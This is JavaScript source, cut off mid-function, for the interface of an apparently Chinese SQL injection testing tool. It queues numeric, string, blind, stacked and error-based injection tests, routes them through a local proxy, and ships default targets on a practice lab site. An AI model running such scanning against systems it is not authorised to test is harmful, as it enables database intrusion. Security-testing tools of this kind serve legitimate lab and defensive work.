// 全局变量
let testResults = [];
let currentTestIndex = 0;
let totalTests = 0;
let positiveResults = 0;
let warningResults = 0;
let errorResults = 0;
let isTesting = false;
let isPaused = false;
let testQueue = [];
let activeTests = 0;
let maxConcurrency = 3;
let proxyStatus = false;
let proxyStatusCheckInterval = null;
// 测试时长相关变量
let testStartTime = null;
let pauseStartTime = null;
let accumulatedPauseTime = 0;
// 保存自动化测试时的配置
let automationTestConfig = null;
// 分页相关变量
let currentPage = 1;
let pageSize = 100; // 默认每页显示100条
let paginatedResults = []; // 分页后的结果
let filteredResults = []; // 过滤后的结果（用于分页）
// 配置保存相关变量
let savedConfigs = [];
const CONFIG_STORAGE_KEY = 'sqlguard_saved_configs';

// 注入类型名称映射
const injectionTypeNames = {
    'numeric': '数字型注入',
    'string_single': '字符型注入（单引号）',
    'string_double': '字符型注入（双引号）',
    'string_backtick': '字符型注入（反引号）',
    'bracket_single': '括号型注入（单引号+括号）',
    'bracket_double': '括号型注入（双引号+括号）',
    'bool_blind': '布尔盲注',
    'time_blind': '时间盲注',
    'stack': '堆叠注入'
};

// 更新选择数量显示
function updateSelectionCount(selectId) {
    const selectElement = document.getElementById(selectId);
    if (!selectElement) return;
    
    const selectedCount = selectElement.selectedOptions.length;
    const totalCount = selectElement.options.length;
    const countElement = document.getElementById(`${selectId}Count`);
    
    if (countElement) {
        countElement.textContent = `${selectedCount}/${totalCount}`;
    }
}

// 全选/取消全选函数
function toggleSelectAll(selectId) {
    const selectElement = document.getElementById(selectId);
    if (!selectElement) return;
    
    const isAllSelected = Array.from(selectElement.options).every(option => option.selected);
    
    if (!isAllSelected) {
        // 当前不是全选状态，执行全选
        Array.from(selectElement.options).forEach(option => {
            option.selected = true;
        });
    } else {
        // 当前是全选状态，执行取消，只选择第一个选项
        Array.from(selectElement.options).forEach((option, index) => {
            option.selected = index === 0;
        });
    }
    
    // 更新选择数量显示
    updateSelectionCount(selectId);
}

// 从本地存储加载配置
function loadSavedConfigs() {
    try {
        const saved = localStorage.getItem(CONFIG_STORAGE_KEY);
        if (saved) {
            savedConfigs = JSON.parse(saved);
        } else {
            // 添加默认配置
            savedConfigs = [
                {
                    name: "Less-3",
                    requestMethod: "GET",
                    url: "https://sqli.hscsec.cn/Less-3/",
                    params: [{ key: "id", value: "1", isChecked: true }],
                    commentVariants: ["hash"],
                    fieldWrappers: ["single_quote_parentheses"],
                    spaceReplacement: ["none"],
                    logicOperators: ["and"],
                    blindInjectionTechniques: ["time_blind"],
                    blindInjectionDelay: 3,
                    concurrency: 3,
                    timeout: 10
                },
                {
                    name: "Less-11",
                    requestMethod: "POST",
                    url: "https://sqli.hscsec.cn/Less-11/",
                    params: [
                        { key: "uname", value: "admin", isChecked: true },
                        { key: "passwd", value: "admin", isChecked: true },
                        { key: "submit", value: "Submit", isChecked: false }
                    ],
                    commentVariants: ["hash"],
                    fieldWrappers: ["single_quote"],
                    spaceReplacement: ["none"],
                    logicOperators: ["and"],
                    blindInjectionTechniques: ["time_blind"],
                    blindInjectionDelay: 3,
                    concurrency: 3,
                    timeout: 10
                }
            ];
            // 保存默认配置到本地存储
            saveConfigsToStorage();
        }
        updateConfigList();
    } catch (error) {
        console.error('加载配置失败:', error);
        savedConfigs = [];
    }
}

// 保存配置到本地存储
function saveConfigsToStorage() {
    try {
        localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(savedConfigs));
    } catch (error) {
        console.error('保存配置失败:', error);
    }
}

// 保存当前配置
function saveCurrentConfig() {
    const configName = document.getElementById('configName').value.trim();
    if (!configName) {
        alert('请输入配置名称');
        return;
    }

    // 获取当前配置
    const config = {
        name: configName,
        requestMethod: document.getElementById('requestMethod').value,
        url: document.getElementById('urlInput').value.trim(),
        params: getParams(),
        commentVariants: Array.from(document.getElementById('commentVariants').selectedOptions).map(option => option.value),
        fieldWrappers: Array.from(document.getElementById('fieldWrappers').selectedOptions).map(option => option.value),
        spaceReplacement: Array.from(document.getElementById('spaceReplacement').selectedOptions).map(option => option.value),
        logicOperators: Array.from(document.getElementById('logicOperators').selectedOptions).map(option => option.value),
        blindInjectionTechniques: Array.from(document.getElementById('blindInjectionTechniques').selectedOptions).map(option => option.value),
        blindInjectionDelay: document.getElementById('blindInjectionDelay').value,
        concurrency: document.getElementById('concurrency').value,
        timeout: document.getElementById('timeout').value
    };

    // 检查是否已存在同名配置
    const existingIndex = savedConfigs.findIndex(c => c.name === configName);
    if (existingIndex >= 0) {
        if (confirm('已存在同名配置，是否覆盖？')) {
            savedConfigs[existingIndex] = config;
        } else {
            return;
        }
    } else {
        savedConfigs.push(config);
    }

    // 保存到本地存储
    saveConfigsToStorage();
    // 更新配置列表
    updateConfigList();
    // 清空配置名称输入框
    document.getElementById('configName').value = '';
}

// 加载配置
function loadConfig(configName) {
    const config = savedConfigs.find(c => c.name === configName);
    if (!config) return;

    // 设置请求方法
    document.getElementById('requestMethod').value = config.requestMethod;
    // 设置URL
    document.getElementById('urlInput').value = config.url;
    // 设置参数
    document.getElementById('paramsList').innerHTML = '';
    config.params.forEach(param => {
        const paramItem = document.createElement('div');
        paramItem.className = 'param-item mb-2 d-flex align-items-center';
        paramItem.innerHTML = `
            <div class="form-check me-2" style="margin-top: 8px;">
                <input class="form-check-input is-injection-point" type="checkbox" ${param.isChecked ? 'checked' : ''}>
            </div>
            <input type="text" class="form-control param-key" placeholder="参数名" value="${param.key}">
            <input type="text" class="form-control param-value ms-2" placeholder="参数值" value="${param.value}">
            <button class="btn btn-danger btn-sm ms-2 remove-param" title="删除参数">
                <i class="fa fa-trash" aria-hidden="true"></i>
            </button>
        `;
        document.getElementById('paramsList').appendChild(paramItem);
        
        // 添加删除参数事件监听器
        paramItem.querySelector('.remove-param').addEventListener('click', function() {
            paramItem.remove();
        });
    });

    // 设置注释变体
    const commentVariants = document.getElementById('commentVariants');
    Array.from(commentVariants.options).forEach(option => {
        option.selected = config.commentVariants.includes(option.value);
    });

    // 设置字段包裹符
    const fieldWrappers = document.getElementById('fieldWrappers');
    Array.from(fieldWrappers.options).forEach(option => {
        option.selected = config.fieldWrappers.includes(option.value);
    });

    // 设置空格替代
    const spaceReplacement = document.getElementById('spaceReplacement');
    Array.from(spaceReplacement.options).forEach(option => {
        option.selected = config.spaceReplacement.includes(option.value);
    });

    // 设置逻辑运算符
    const logicOperators = document.getElementById('logicOperators');
    Array.from(logicOperators.options).forEach(option => {
        option.selected = config.logicOperators.includes(option.value);
    });

    // 设置时间盲注
    const blindInjectionTechniques = document.getElementById('blindInjectionTechniques');
    Array.from(blindInjectionTechniques.options).forEach(option => {
        option.selected = config.blindInjectionTechniques.includes(option.value);
    });

    // 设置盲注延迟时间
    document.getElementById('blindInjectionDelay').value = config.blindInjectionDelay;
    // 设置并发数
    document.getElementById('concurrency').value = config.concurrency;
    // 设置超时时间
    document.getElementById('timeout').value = config.timeout;
    
    // 更新所有选择框的计数
    const testOptionSelects = ['commentVariants', 'fieldWrappers', 'spaceReplacement', 'logicOperators', 'blindInjectionTechniques'];
    testOptionSelects.forEach(selectId => {
        updateSelectionCount(selectId);
    });
}

// 删除配置
function deleteConfig(configName) {
    savedConfigs = savedConfigs.filter(c => c.name !== configName);
    saveConfigsToStorage();
    updateConfigList();
}

// 更新配置列表显示
function updateConfigList() {
    const configList = document.getElementById('configList');
    configList.innerHTML = '';

    savedConfigs.forEach(config => {
        const listItem = document.createElement('li');
        listItem.className = 'list-group-item d-flex justify-content-between align-items-center';
        listItem.innerHTML = `
            <span class="config-name" style="cursor: pointer;">${config.name}</span>
            <div>
                <button class="btn btn-sm btn-primary me-1 load-config-btn" data-config-name="${config.name}">
                    <i class="fa fa-folder-open" aria-hidden="true"></i> 加载
                </button>
                <button class="btn btn-sm btn-danger delete-config-btn" data-config-name="${config.name}">
                    <i class="fa fa-trash" aria-hidden="true"></i> 删除
                </button>
            </div>
        `;
        configList.appendChild(listItem);
    });

    // 添加事件监听器
    document.querySelectorAll('.config-name').forEach(item => {
        item.addEventListener('click', function() {
            const configName = this.textContent.trim();
            loadConfig(configName);
        });
    });

    document.querySelectorAll('.load-config-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const configName = this.getAttribute('data-config-name');
            loadConfig(configName);
        });
    });

    document.querySelectorAll('.delete-config-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const configName = this.getAttribute('data-config-name');
            deleteConfig(configName);
        });
    });
}

// DOM加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    loadThemePreference();
    updateTestStats();
    updateProgress();
    checkProxyStatus();
    // 加载保存的配置
    loadSavedConfigs();
    // 定期检测proxy状态，每5秒一次
    proxyStatusCheckInterval = setInterval(checkProxyStatus, 5000);
    // 初始化可调整列宽功能
    initTableResizableColumns();
    // 初始化面板拖拽调整宽度功能
    initPanelResize();
});

// 初始化可调整列宽功能
function initResizableColumns() {
    const table = document.getElementById('resultsTable');
    if (!table) return;
    
    // 移除旧的调整手柄
    const oldResizers = table.querySelectorAll('.resizer');
    oldResizers.forEach(resizer => resizer.remove());
    
    // 重置表格布局
    table.style.tableLayout = 'fixed';
    
    const thead = table.querySelector('thead');
    const thElements = thead.querySelectorAll('th');
    
    let resizing = false;
    let currentTh = null;
    let startX = 0;
    let startWidth = 0;
    let minWidth = 50;
    
    // 创建一个全局的调整指示条
    const resizeIndicator = document.createElement('div');
    resizeIndicator.className = 'resize-indicator';
    resizeIndicator.style.cssText = `
        position: absolute;
        top: 0;
        height: 100%;
        width: 2px;
        background-color: #0d6efd;
        z-index: 1000;
        display: none;
        pointer-events: none;
    `;
    document.body.appendChild(resizeIndicator);
    
    // 为每个th添加调整功能
    thElements.forEach((th, index) => {
        // 确保th有相对定位
        th.style.position = 'relative';
        
        // 确保响应体预览(1=1)和响应体预览(1=2)列宽相同
        if (index === 15 || index === 16) {
            const width = 200;
            th.style.width = `${width}px`;
        }
        
        // 创建调整手柄
        const resizer = document.createElement('div');
        resizer.className = 'resizer';
        resizer.style.cssText = `
            position: absolute;
            top: 0;
            right: 0;
            width: 10px;
            height: 100%;
            cursor: col-resize;
            background-color: transparent;
            z-index: 10;
        `;
        th.appendChild(resizer);
        
        // 鼠标按下事件
        resizer.addEventListener('mousedown', (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            resizing = true;
            currentTh = th;
            startX = e.clientX;
            startWidth = th.offsetWidth;
            
            // 获取表格在视口中的位置
            const tableRect = table.getBoundingClientRect();
            
            // 设置指示条位置
            resizeIndicator.style.display = 'block';
            resizeIndicator.style.top = `${tableRect.top}px`;
            resizeIndicator.style.height = `${tableRect.height}px`;
            resizeIndicator.style.left = `${tableRect.left + th.offsetLeft + th.offsetWidth}px`;
            
            // 添加全局事件监听
            document.addEventListener('mousemove', handleMouseMove);
            document.addEventListener('mouseup', handleMouseUp);
            document.addEventListener('mouseleave', handleMouseUp);
            
            // 防止文本选择和拖动
            document.body.style.userSelect = 'none';
            document.body.style.cursor = 'col-resize';
        });
    });
    
    // 鼠标移动事件
    function handleMouseMove(e) {
        e.preventDefault();
        e.stopPropagation();
        
        if (!resizing || !currentTh) return;
        
        // 计算新宽度
        const deltaX = e.clientX - startX;
        const newWidth = Math.max(minWidth, startWidth + deltaX);
        
        // 更新指示条位置
        const tableRect = table.getBoundingClientRect();
        const thRect = currentTh.getBoundingClientRect();
        resizeIndicator.style.left = `${tableRect.left + thRect.left + newWidth}px`;
        
        // 更新th宽度
        currentTh.style.width = `${newWidth}px`;
        
        // 如果调整的是响应体预览(1=1)或响应体预览(1=2)，同步调整另一列
        const colIndex = Array.from(thElements).indexOf(currentTh);
        if (colIndex === 15 || colIndex === 16) {
            const otherColIndex = colIndex === 15 ? 16 : 15;
            const otherTh = thElements[otherColIndex];
            otherTh.style.width = `${newWidth}px`;
        }
        
        // 更新对应列的所有td宽度
        const tbodyRows = table.querySelectorAll('tbody tr');
        
        tbodyRows.forEach(row => {
            const tds = row.querySelectorAll('td');
            if (tds[colIndex]) {
                tds[colIndex].style.width = `${newWidth}px`;
            }
            // 如果是响应体预览列，同步更新另一列的td宽度
            if (colIndex === 15 || colIndex === 16) {
                const otherColIndex = colIndex === 15 ? 16 : 15;
                if (tds[otherColIndex]) {
                    tds[otherColIndex].style.width = `${newWidth}px`;
                }
            }
        });
        
        // 更新colgroup中的col宽度
        const cols = table.querySelectorAll('col');
        if (cols[colIndex]) {
            cols[colIndex].style.width = `${newWidth}px`;
        }
        // 如果是响应体预览列，同步更新另一列的col宽度
        if (colIndex === 15 || colIndex === 16) {
            const otherColIndex = colIndex === 15 ? 16 : 15;
            if (cols[otherColIndex]) {
                cols[otherColIndex].style.width = `${newWidth}px`;
            }
        }
    }
    
    // 鼠标释放事件
    function handleMouseUp(e) {
        e.preventDefault();
        e.stopPropagation();
        
        resizing = false;
        currentTh = null;
        
        // 隐藏指示条
        resizeIndicator.style.display = 'none';
        
        // 移除全局事件监听
        document.removeEventListener('mousemove', handleMouseMove);
        document.removeEventListener('mouseup', handleMouseUp);
        document.removeEventListener('mouseleave', handleMouseUp);
        
        // 恢复正常状态
        document.body.style.userSelect = '';
        document.body.style.cursor = '';
    }
}

// 检测代理服务器状态
async function checkProxyStatus() {
    try {
        const response = await fetch('http://localhost:3001/status', {
            method: 'GET',
            timeout: 2000
        });
        proxyStatus = response.ok;
    } catch (error) {
        proxyStatus = false;
    }
    updateProxyStatusDisplay();
    return proxyStatus;
}

// 更新代理服务器状态显示
function updateProxyStatusDisplay() {
    const proxyStatusElement = document.getElementById('proxyStatus');
    if (proxyStatusElement) {
        if (proxyStatus) {
            proxyStatusElement.className = 'alert alert-success mb-0';
            proxyStatusElement.innerHTML = '<i class="fa fa-check-circle" aria-hidden="true"></i> 代理服务器运行正常';
        } else {
            proxyStatusElement.className = 'alert alert-danger mb-0';
            proxyStatusElement.innerHTML = '<i class="fa fa-exclamation-circle" aria-hidden="true"></i> 代理服务器未运行，请先确保已下载 <a href="proxy.js" download style="color: #0000ff; font-family: monospace; text-decoration: underline; font-weight: normal;">proxy.js</a> 文件，并执行 <code>node proxy.js</code> 启动代理服务器';
        }
    }
}

// 初始化事件监听器
function initializeEventListeners() {
    // URL解析按钮
    document.getElementById('parseUrlBtn').addEventListener('click', parseUrl);
    
    // URL输入框回车事件
    document.getElementById('urlInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            parseUrl();
        }
    });
    
    // 添加参数按钮
    document.getElementById('addParamBtn').addEventListener('click', addParam);
    
    // 开始测试按钮
    document.getElementById('startTestBtn').addEventListener('click', startAutomatedTest);
    
    // 仅生成语法按钮
    document.getElementById('generateSyntaxBtn').addEventListener('click', generateSyntaxOnly);
    
    // 清空结果按钮
    document.getElementById('clearResultsBtn').addEventListener('click', clearResults);
    
    // 主题切换按钮
    document.getElementById('themeToggle').addEventListener('click', toggleTheme);
    
    // 保存配置按钮
    document.getElementById('saveConfigBtn').addEventListener('click', saveCurrentConfig);
    
    // 语法分类按钮
    document.querySelectorAll('.syntax-category-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            filterSyntax(this.dataset.category);
        });
    });
    
    // 暂停测试按钮
    document.getElementById('pauseTestBtn').addEventListener('click', pauseTest);
    
    // 终止测试按钮
    document.getElementById('stopTestBtn').addEventListener('click', stopTest);
    
    // 结果筛选
    document.getElementById('resultFilter').addEventListener('change', filterResults);
    document.getElementById('riskFilter').addEventListener('change', filterResults);
    
    // 分页控件事件
    document.getElementById('pageSizeSelect').addEventListener('change', handlePageSizeChange);
    document.getElementById('prevPageBtn').addEventListener('click', handlePrevPage);
    document.getElementById('nextPageBtn').addEventListener('click', handleNextPage);
    document.getElementById('searchResults').addEventListener('input', filterResults);
    
    // 测试选项change事件监听器
    const testOptionSelects = ['commentVariants', 'fieldWrappers', 'spaceReplacement', 'logicOperators', 'blindInjectionTechniques'];
    testOptionSelects.forEach(selectId => {
        const selectElement = document.getElementById(selectId);
        if (selectElement) {
            selectElement.addEventListener('change', function() {
                updateSelectionCount(selectId);
            });
        }
    });
    
    // 初始化所有选择数量显示
    testOptionSelects.forEach(selectId => {
        updateSelectionCount(selectId);
    });
    
    // 复制详情按钮
    document.getElementById('copyDetailBtn').addEventListener('click', copyDetailToClipboard);
    
    // Excel导出按钮
    document.getElementById('exportExcelBtn').addEventListener('click', exportExcel);
    
    // 清空筛选按钮
    document.getElementById('clearFiltersBtn').addEventListener('click', clearAllFilters);
    
    // 为初始参数项添加删除事件监听器
    document.querySelectorAll('.remove-param').forEach(btn => {
        btn.addEventListener('click', function() {
            this.closest('.param-item').remove();
        });
    });
    
    // 尝试注入模态框事件
    document.getElementById('runFieldCountBtn').addEventListener('click', runFieldCount);
    document.getElementById('runDisplayPositionBtn').addEventListener('click', runDisplayPosition);
    document.getElementById('runInjectionBtn').addEventListener('click', runInjection);
    document.getElementById('runErrorInjectionBtn').addEventListener('click', runErrorInjection);
    document.getElementById('runUpdateXmlInjectionBtn').addEventListener('click', runUpdateXmlInjection);
    document.getElementById('runExtractValueInjectionBtn').addEventListener('click', runExtractValueInjection);
    
    // 移除测试配置变化时的自动更新，避免调整测试选项时刷新结果列表
    // 测试结果应基于测试执行时的配置，而非当前配置
}

// 加载主题偏好
function loadThemePreference() {
    const isDarkMode = localStorage.getItem('darkMode') === 'true';
    if (isDarkMode) {
        document.body.classList.add('dark-mode');
        updateThemeToggleText(true);
    }
}

// 切换主题
function toggleTheme() {
    const isDarkMode = document.body.classList.toggle('dark-mode');
    localStorage.setItem('darkMode', isDarkMode);
    updateThemeToggleText(isDarkMode);
}

// 更新主题切换按钮文本
function updateThemeToggleText(isDarkMode) {
    const themeToggle = document.getElementById('themeToggle');
    if (isDarkMode) {
        themeToggle.innerHTML = '<i class="fa fa-sun-o" aria-hidden="true"></i> 亮色模式';
    } else {
        themeToggle.innerHTML = '<i class="fa fa-moon-o" aria-hidden="true"></i> 暗色模式';
    }
}

// 自定义URL解码函数，处理特殊字符如%09和%0A，包括双重编码情况
function customUrlDecode(str) {
    let decoded = str;
    
    try {
        // 第一步：先进行标准URL解码（处理%250A → %0A）
        decoded = decodeURIComponent(decoded);
        
        // 第二步：处理所有特殊字符编码（处理%0A → 换行符，%09 → 制表符等）
        // 使用正则表达式匹配所有可能的十六进制编码
        decoded = decoded.replace(/%([0-9A-Fa-f]{2})/g, function(match, hex) {
            const charCode = parseInt(hex, 16);
            return String.fromCharCode(charCode);
        });
        
    } catch (e) {
        // 如果解码失败，返回原始字符串
        console.error('URL解码失败:', e);
    }
    
    return decoded;
}

// 解析URL
function parseUrl() {
    const urlInput = document.getElementById('urlInput').value.trim();
    if (!urlInput) return;
    
    try {
        const url = new URL(urlInput);
        const params = new URLSearchParams(url.search);
        
        // 清空现有参数
        const paramsList = document.getElementById('paramsList');
        paramsList.innerHTML = '';
        
        // 添加解析出的参数
        if (params.size === 0) {
            // 如果没有参数，添加一个默认参数
            addParam();
        } else {
            params.forEach((value, key) => {
                // 使用自定义解码函数处理特殊字符
                const decodedKey = customUrlDecode(key);
                const decodedValue = customUrlDecode(value);
                addParam(decodedKey, decodedValue);
            });
        }
        
        // 更新URL输入框，移除参数部分
        const cleanUrl = url.origin + url.pathname;
        document.getElementById('urlInput').value = cleanUrl;
        
        // 显示成功提示
        showToast('URL解析成功！', 'success');
    } catch (error) {
        showToast('URL格式错误，请检查输入！', 'error');
    }
}

// 添加参数
function addParam(key = '', value = '') {
    const paramsList = document.getElementById('paramsList');
    const paramItem = document.createElement('div');
    paramItem.className = 'param-item mb-2 d-flex align-items-center';
    paramItem.innerHTML = `
        <div class="form-check me-2" style="margin-top: 8px;">
            <input class="form-check-input is-injection-point" type="checkbox" checked>
        </div>
        <input type="text" class="form-control param-key" placeholder="参数名" value="${key}">
        <input type="text" class="form-control param-value ms-2" placeholder="参数值" value="${value}">
        <button class="btn btn-danger btn-sm ms-2 remove-param" title="删除参数">
            <i class="fa fa-trash" aria-hidden="true"></i>
        </button>
    `;
    paramsList.appendChild(paramItem);
    
    // 添加删除事件监听
    paramItem.querySelector('.remove-param').addEventListener('click', function() {
        paramItem.remove();
    });
}

// 获取所有参数
function getParams() {
    const paramItems = document.querySelectorAll('.param-item');
    const params = [];
    
    paramItems.forEach(item => {
        const key = item.querySelector('.param-key').value.trim();
        const value = item.querySelector('.param-value').value.trim();
        const isChecked = item.querySelector('.is-injection-point').checked;
        if (key) {
            params.push({ key, value, isChecked });
        }
    });
    
    return params;
}

// 获取测试配置
function getTestConfig() {
    // 获取用户选择的字段包裹符
    const fieldWrappers = Array.from(document.getElementById('fieldWrappers').selectedOptions).map(option => option.value);
    
    // 动态生成注入类型，根据用户选择的字段包裹符
    const injectionTypes = ['numeric', 'time_blind', 'error', 'stack'];
    
    // 根据选择的包裹符添加对应的字符串注入类型
    if (fieldWrappers.includes('single_quote')) {
        injectionTypes.push('string_single');
    }
    if (fieldWrappers.includes('double_quote')) {
        injectionTypes.push('string_double');
    }
    if (fieldWrappers.includes('backtick')) {
        injectionTypes.push('string_backtick');
    }
    // 只有当选择了单引号+小括号或单引号+中括号时才添加bracket_single注入类型
    if (fieldWrappers.includes('single_quote_parentheses') || fieldWrappers.includes('single_quote_square_bracket')) {
        injectionTypes.push('bracket_single');
    }
    // 只有当选择了双引号+小括号或双引号+中括号时才添加bracket_double注入类型
    if (fieldWrappers.includes('double_quote_parentheses') || fieldWrappers.includes('double_quote_square_bracket')) {
        injectionTypes.push('bracket_double');
    }
    
    return {
        injectionTypes: injectionTypes,
        commentVariants: Array.from(document.getElementById('commentVariants').selectedOptions).map(option => option.value),
        fieldWrappers: fieldWrappers,
        spaceReplacement: Array.from(document.getElementById('spaceReplacement').selectedOptions).map(option => option.value),
        logicOperators: Array.from(document.getElementById('logicOperators').selectedOptions).map(option => option.value),
        blindInjectionTechniques: Array.from(document.getElementById('blindInjectionTechniques').selectedOptions).map(option => option.value),
        blindInjectionDelay: parseInt(document.getElementById('blindInjectionDelay').value),
        concurrency: parseInt(document.getElementById('concurrency').value),
        timeout: parseInt(document.getElementById('timeout').value),
        requestMethod: document.getElementById('requestMethod').value,

    };
}

// 开始自动化测试
async function startAutomatedTest() {
    const url = document.getElementById('urlInput').value.trim();
    if (!url) {
        showToast('请输入目标URL！', 'error');
        return;
    }
    
    const params = getParams();
    if (params.length === 0) {
        showToast('请添加至少一个测试参数！', 'error');
        return;
    }
    
    // 清空之前的结果
    clearResults();
    
    // 更新测试状态
    isTesting = true;
    updateTestButtonsState(true);
    
    // 获取测试配置
    const config = getTestConfig();
    // 保存测试配置到全局变量
    automationTestConfig = config;
    maxConcurrency = config.concurrency;
    
    // 生成测试队列
    generateTestQueue(url, params, config);
    
    // 初始化测试统计
    totalTests = testQueue.length;
    currentTestIndex = 0;
    positiveResults = 0;
    warningResults = 0;
    errorResults = 0;
    activeTests = 0;
    // 重置暂停相关变量
    accumulatedPauseTime = 0;
    pauseStartTime = null;
    // 记录测试开始时间
    testStartTime = Date.now();
    
    updateTestStats();
    updateProgress();
    
    // 开始执行测试队列
    executeTestQueue();
}

// 生成测试队列
function generateTestQueue(url, params, config) {
    testQueue = [];
    const globalUniqueTestCases = new Set(); // 用于跨注入类型去重
    
    // 只为选中的参数生成测试用例
    params.forEach(param => {
        // 检查参数是否被选为注入点
        if (param.isChecked) {
            config.injectionTypes.forEach(injectionType => {
                // 生成不同类型的测试用例
                const testCases = generateTestCases(injectionType, param);
                
                testCases.forEach(testCase => {
                    // 创建所有参数的完整副本，用于1=1和1=2测试
                    const allParams = {};
                    params.forEach(p => {
                        allParams[p.key] = p.value;
                    });
                    
                    // 构建完整的URL，用于去重
                    let fullUrl = url;
                    let fullBody = '';
                    
                    // 根据请求方法构建完整的测试URL
                    if (config.requestMethod === 'GET') {
                        // 构建GET请求的URL
                        const testParams = {...allParams};
                        testParams[param.key] = testCase.payload;
                        const urlObj = new URL(fullUrl);
                        urlObj.search = new URLSearchParams(testParams).toString();
                        fullUrl = urlObj.toString();
                    } else {
                        // 构建POST请求的主体
                        const testParams = {...allParams};
                        testParams[param.key] = testCase.payload;
                        fullBody = new URLSearchParams(testParams).toString();
                    }
                    
                    // 生成唯一标识符，用于跨注入类型去重
                    // 添加spaceReplacement到唯一ID中，确保不同空格替代选项的测试用例不被错误去重
                    const uniqueId = `${fullUrl}-${fullBody}-${config.requestMethod}-${testCase.spaceReplacement}`;
                    
                    // 只有当该测试用例没有被添加过时，才添加它
                    if (!globalUniqueTestCases.has(uniqueId)) {
                        globalUniqueTestCases.add(uniqueId);
                        
                        // 创建测试项目对象，用于构建测试URL
                        const testItem = {
                            url: url,
                            param: param,
                            injectionType: injectionType,
                            testCase: testCase,
                            config: config,
                            params: allParams // 保存所有参数的原始值
                        };
                        
                        // 添加测试用例到队列
                        testQueue.push(testItem);
                    }
                });
            });
        }
    });
}

// 生成测试用例
function generateTestCases(injectionType, param) {
    const testCases = [];
    const uniqueTestCases = new Set(); // 用于跟踪唯一的测试用例
    
    // 设置默认测试深度为medium
    const testDepth = 'medium';
    
    // 获取用户选择的配置
    const testConfig = getTestConfig();
    const selectedWrappers = testConfig.fieldWrappers;
    const selectedSpaceReplacements = testConfig.spaceReplacement;
    const selectedLogicOperators = testConfig.logicOperators;
    const blindInjectionDelay = testConfig.blindInjectionDelay;
    const selectedVariants = testConfig.commentVariants;
    const selectedBlindTechniques = testConfig.blindInjectionTechniques;
    
    // 检查是否选择了时间盲注技术，确保在所有情况下都定义了isTimeBlindSelected变量
    // 如果选择了"无"选项，则不视为选择了时间盲注技术
    const isTimeBlindSelected = selectedBlindTechniques.includes('none') ? false : selectedBlindTechniques.some(tech => tech.includes('time_blind'));
    
    // 注释变体英文到中文的映射
    const commentVariantMap = {
        'no_comment': '不带注释',
        'double_dash': '双横线注释',
        'double_dash_plus': '双横线+注释',
        'hash': '井号注释',
        'multi_line': '多行注释',
        'inline': '内联注释',
        'double_dash_space': '双重注释'
    };
    
    // 时间盲注英文到中文的映射
    const blindTechniqueMap = {
        'time_blind_mysql': '时间盲注MySQL',
        'time_blind_pg': '时间盲注PostgreSQL',
        'time_blind_mssql': '时间盲注SQLServer'
    };
    
    // 逻辑运算符英文到中文的映射
    const logicOperatorMap = {
        'none': '无',
        'and': 'AND',
        'or': 'OR',
        'and_double_ampersand': 'AND变体(&&)',
        'or_double_pipe': 'OR变体(||)',
        'not_equal': '不等于(<>))',
        'like': 'LIKE操作符',
        'in': 'IN操作符',
        'regexp': 'REGEXP操作符'
    };
    
    // 辅助函数：生成唯一测试用例ID
    function getUniqueTestCaseId(testCase) {
        // 使用完整的payload和注释变体生成唯一ID，忽略空格替换策略
        // 这样每个注释变体的测试用例只生成一次，无论选择了多少种空格替换策略
        return `${testCase.injectionType}-${testCase.payload}-${testCase.commentVariant || 'none'}`;
    }
    
    // 辅助函数：添加测试用例
    function addTestCase(testCase) {
        
        // 重新获取用户选择的配置，确保使用最新的包裹符选择
        const currentTestConfig = getTestConfig();
        const currentSelectedWrappers = currentTestConfig.fieldWrappers;
        
        // 检查包裹符是否被用户选择
        let isWrapperSelected = false;
        // 时间盲注测试用例总是允许，无论wrapperType是什么
        if (testCase.injectionType === 'time_blind') {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '无' && currentSelectedWrappers.includes('none')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '单引号' && currentSelectedWrappers.includes('single_quote')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '双引号' && currentSelectedWrappers.includes('double_quote')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '反引号' && currentSelectedWrappers.includes('backtick')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '方括号' && currentSelectedWrappers.includes('square_bracket')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '小括号' && currentSelectedWrappers.includes('parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '单引号+小括号' && currentSelectedWrappers.includes('single_quote_parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '小括号+小括号' && currentSelectedWrappers.includes('parentheses_parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '单引号+小括号+小括号' && currentSelectedWrappers.includes('single_quote_parentheses_parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '双引号+小括号' && currentSelectedWrappers.includes('double_quote_parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '双引号+小括号+小括号' && currentSelectedWrappers.includes('double_quote_parentheses_parentheses')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '单引号+双引号' && currentSelectedWrappers.includes('single_quote_double_quote')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '双引号+单引号' && currentSelectedWrappers.includes('double_quote_single_quote')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '单引号+中括号' && currentSelectedWrappers.includes('single_quote_square_bracket')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '双引号+中括号' && currentSelectedWrappers.includes('double_quote_square_bracket')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '十六进制' && currentSelectedWrappers.includes('hex')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === 'CHAR函数' && currentSelectedWrappers.includes('char_function')) {
            isWrapperSelected = true;
        } else if (testCase.wrapperType === '括号') {
            // 对于括号类型，检查是否匹配注入类型对应的包裹符
            const injectionType = testCase.injectionType || '';
            if ((injectionType.includes('single') && currentSelectedWrappers.includes('single_quote')) ||
                (injectionType.includes('double') && currentSelectedWrappers.includes('double_quote'))) {
                isWrapperSelected = true;
            }
        }
        
        // 只有当包裹符被选择时，才添加测试用例
        if (isWrapperSelected) {
            // 重新获取用户选择的空格替代选项，确保使用最新配置
